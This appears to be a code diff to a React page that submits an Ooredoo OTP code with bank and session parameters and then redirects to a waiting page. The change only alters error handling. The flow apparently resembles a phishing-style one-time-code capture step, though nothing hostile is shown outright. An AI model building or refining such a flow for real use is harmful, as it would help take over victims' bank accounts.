@@ -37,10 +37,11 @@ export default function OtpOoredoo() {
         otpCode: otp,
         otpType: "ooredoo",
       });
+      // التقدم فقط بعد نجاح الإرسال
       setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=success`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
-      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=success`);
+      console.error("Error submitting Ooredoo OTP:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "Error during submission. Please try again.");
     }
   };
 
